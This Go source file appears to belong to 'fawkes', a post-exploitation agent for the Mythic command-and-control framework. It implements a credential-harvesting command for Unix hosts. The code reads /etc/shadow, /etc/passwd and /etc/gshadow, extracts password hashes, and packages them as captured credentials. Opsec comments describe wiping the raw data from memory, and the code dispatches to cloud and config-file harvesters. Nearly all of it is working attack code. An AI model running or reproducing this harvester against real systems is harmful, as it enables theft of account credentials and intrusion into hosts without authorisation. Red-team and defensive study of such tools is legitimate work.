//go:build !windows

package commands

import (
	"fmt"
	"os"
	"strings"

	"fawkes/pkg/structs"
)

func credHarvestDispatch(args credHarvestArgs) structs.CommandResult {
	switch strings.ToLower(args.Action) {
	case "shadow":
		return credShadow(args)
	case "cloud":
		return credCloud(args)
	case "configs":
		return credConfigs(args)
	case "all":
		return credAll(args)
	default:
		return errorf("Unknown action: %s\nAvailable: shadow, cloud, configs, all", args.Action)
	}
}

func credShadow(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	var creds []structs.MythicCredential

	sb.WriteString("System Credential Files\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	// /etc/shadow — hashed passwords
	sb.WriteString("--- /etc/shadow ---\n")
	if data, err := os.ReadFile("/etc/shadow"); err == nil {
		defer structs.ZeroBytes(data) // opsec: clear raw shadow data
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		entries := parseShadowLines(lines, args.User)
		for _, e := range entries {
			sb.WriteString(fmt.Sprintf("  %s:%s\n", e.User, e.Hash))
			creds = append(creds, structs.MythicCredential{
				CredentialType: "hash",
				Realm:          "",
				Account:        e.User,
				Credential:     e.Hash,
				Comment:        "cred-harvest shadow",
			})
		}
		if len(entries) == 0 {
			sb.WriteString("  (no password hashes found — accounts may be locked)\n")
		}
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v (requires root)\n", err))
	}

	// /etc/passwd — check for password hashes in passwd (legacy)
	sb.WriteString("\n--- /etc/passwd (accounts with shells) ---\n")
	if data, err := os.ReadFile("/etc/passwd"); err == nil {
		defer structs.ZeroBytes(data) // opsec: clear passwd data from memory
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		entries := parsePasswdLines(lines, args.User)
		for _, e := range entries {
			sb.WriteString(fmt.Sprintf("  %s (uid=%s, gid=%s, home=%s, shell=%s)\n", e.User, e.UID, e.GID, e.Home, e.Shell))
			if e.PasswdHash != "" {
				sb.WriteString(fmt.Sprintf("    WARNING: Password hash in /etc/passwd: %s\n", e.PasswdHash))
			}
		}
	}

	// /etc/gshadow if readable
	sb.WriteString("\n--- /etc/gshadow ---\n")
	if data, err := os.ReadFile("/etc/gshadow"); err == nil {
		defer structs.ZeroBytes(data) // opsec: clear raw gshadow data
		lines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
		entries := parseGshadowLines(lines)
		for _, e := range entries {
			sb.WriteString(fmt.Sprintf("  %s\n", e.Line))
		}
		if len(entries) == 0 {
			sb.WriteString("  (no group passwords found)\n")
		}
	} else {
		sb.WriteString(fmt.Sprintf("  Error: %v\n", err))
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(creds) > 0 {
		result.Credentials = &creds
	}
	return result
}

func credAll(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	var allCreds []structs.MythicCredential

	shadow := credShadow(args)
	sb.WriteString(shadow.Output)
	sb.WriteString("\n")
	if shadow.Credentials != nil {
		allCreds = append(allCreds, *shadow.Credentials...)
	}

	cloud := credCloud(args)
	sb.WriteString(cloud.Output)
	sb.WriteString("\n")
	if cloud.Credentials != nil {
		allCreds = append(allCreds, *cloud.Credentials...)
	}

	configs := credConfigs(args)
	sb.WriteString(configs.Output)
	if configs.Credentials != nil {
		allCreds = append(allCreds, *configs.Credentials...)
	}

	result := structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
	if len(allCreds) > 0 {
		result.Credentials = &allCreds
	}
	return result
}

// getUserHomes returns home directories from /etc/passwd, optionally filtered by user
func getUserHomes(filterUser string) []string {
	var homes []string

	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		if home, err := os.UserHomeDir(); err == nil {
			return []string{home}
		}
		return nil
	}

	for _, line := range strings.Split(string(data), "\n") {
		parts := strings.Split(line, ":")
		if len(parts) < 6 {
			continue
		}
		user := parts[0]
		home := parts[5]

		if filterUser != "" && !strings.Contains(strings.ToLower(user), strings.ToLower(filterUser)) {
			continue
		}

		if home == "" || home == "/" || home == "/nonexistent" || home == "/dev/null" {
			continue
		}

		if info, err := os.Stat(home); err == nil && info.IsDir() {
			homes = append(homes, home)
		}
	}

	return homes
}
